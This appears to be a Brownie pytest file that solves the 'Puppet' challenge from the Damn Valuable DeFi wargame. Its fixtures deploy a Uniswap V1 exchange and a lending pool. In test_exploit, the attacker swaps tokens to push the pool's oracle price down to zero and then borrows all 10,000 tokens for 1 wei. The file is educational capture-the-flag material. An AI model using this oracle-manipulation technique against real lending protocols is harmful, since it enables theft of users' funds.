import pytest
import json
from brownie import DamnValuableToken, PuppetPool, web3, Contract, chain


@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]

@pytest.fixture(scope='module')
def token(deployer):
    # Deploy token to be traded in Uniswap
    return DamnValuableToken.deploy({'from':deployer})

@pytest.fixture(scope='module')
def exchangeTemplate(deployer,Contract):
    # Deploy a exchange that will be used as the factory template
    contractArtifacts = json.loads(open("../brownie-port/build-uniswap-v1/UniswapV1Exchange.json").read())
    contract = web3.eth.contract(abi=contractArtifacts['abi'],bytecode=contractArtifacts['bytecode'])
    tx_hash = contract.constructor().transact({'from': deployer.address})
    tx_receipt = web3.eth.get_transaction_receipt(tx_hash)

    return Contract.from_abi(
        "UniswapV1Exchange",
        tx_receipt['contractAddress'],
        contractArtifacts['abi']
        )


@pytest.fixture(scope='module')
def uniswapFactory(deployer,Contract):
    #  Deploy factory
    contractArtifacts = json.loads(open("../brownie-port/build-uniswap-v1/UniswapV1Factory.json").read())
    contract = web3.eth.contract(abi=contractArtifacts['abi'],bytecode=contractArtifacts['bytecode'])
    tx_hash = contract.constructor().transact({'from': deployer.address})
    tx_receipt = web3.eth.get_transaction_receipt(tx_hash)

    return Contract.from_abi(
        "UniswapV1Factory",
        tx_receipt['contractAddress'],
        contractArtifacts['abi']
        )

@pytest.fixture(scope='module')
def uniswapExchange(token,uniswapFactory,exchangeTemplate,deployer):
    # initializing Factory with the address of the template exchange
    uniswapFactory.initializeFactory(exchangeTemplate.address, {'from': deployer})
    # Create a new exchange for the token, and retrieve the deployed exchange's address
    exchangeAddress = uniswapFactory.createExchange(token.address,{'from':deployer})
    uniswapExchange = Contract.from_abi('UniswapExchange',
    exchangeAddress.events[0]['exchange'],
    abi=json.loads(open("../brownie-port/build-uniswap-v1/UniswapV1Exchange.json").read())['abi']
    )

    return uniswapExchange

@pytest.fixture(scope='module')
def lendingPool(token,uniswapExchange,deployer):
    # Deploy the lending pool
    return PuppetPool.deploy(token.address,uniswapExchange.address, {'from':deployer})

@pytest.fixture(scope='module',autouse=True)
def setup(uniswapFactory,exchangeTemplate,uniswapExchange,token,lendingPool,deployer,attacker):
    ''' [Challenge] Puppet '''
    # Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    UNISWAP_INITIAL_TOKEN_RESERVE = 10e18
    UNISWAP_INITIAL_ETH_RESERVE = 10e18
    POOL_INITIAL_TOKEN_BALANCE = 10000e18
    ATTACKER_INITAL_TOKEN_BALANCE = 100e18

   

    # Add initial token and ETH liquidity to the pool
    token.approve(uniswapExchange.address,UNISWAP_INITIAL_TOKEN_RESERVE,{'from':deployer})

    deadline = chain[-1].timestamp * 2

    uniswapExchange.addLiquidity(0,
        UNISWAP_INITIAL_TOKEN_RESERVE,
        deadline,
        {'from':deployer,'value': UNISWAP_INITIAL_ETH_RESERVE})


    # Setup initial token balances of pool and attacker account                                                                                        
    token.transfer(attacker.address, ATTACKER_INITAL_TOKEN_BALANCE, { 'from': deployer })
    token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE, { 'from': deployer })

    # Rate should be 1:1
    assert lendingPool.computeOraclePrice() == 1


@pytest.fixture(scope='module')
def attackerBalance(attacker):
    # Track attacker's initial ETH balance (to ensure it doesn't decrease)
   return attacker.balance()

def test_exploit(uniswapExchange,token,lendingPool,attacker,attackerBalance):
    # Exploit goes here  
    
    # computeOraclePrice divide uniswap ETH balance by uniswap token balance. if  ETH<token the result = 0 
    # then in borrow tokenPriceInWei = 0 and depositRequired = 0
    # refer to the Uniswap Doc for function description https://docs.uniswap.org/protocol/V1/reference/exchange

    # we need to sell DVT token and get ETH from the Uniswap Exchange
    token.approve(uniswapExchange.address,10,{'from':attacker})
    uniswapExchange.tokenToEthSwapInput(10,1,chain.time() + 1,{'from':attacker})

    # check the price
    price = lendingPool.computeOraclePrice()
    assert price == 0

    DVTBalance = token.balanceOf(lendingPool)
    # borrow
    lendingPool.borrow(DVTBalance,{'from':attacker,'value':'1 wei'})

def test_success(token,lendingPool,attacker,attackerBalance):

    
    POOL_INITIAL_TOKEN_BALANCE = 10000e18

    # Attacker has stolen all tokens from the pool
    assert token.balanceOf(attacker.address) >= POOL_INITIAL_TOKEN_BALANCE
    assert token.balanceOf(lendingPool.address) == 0
    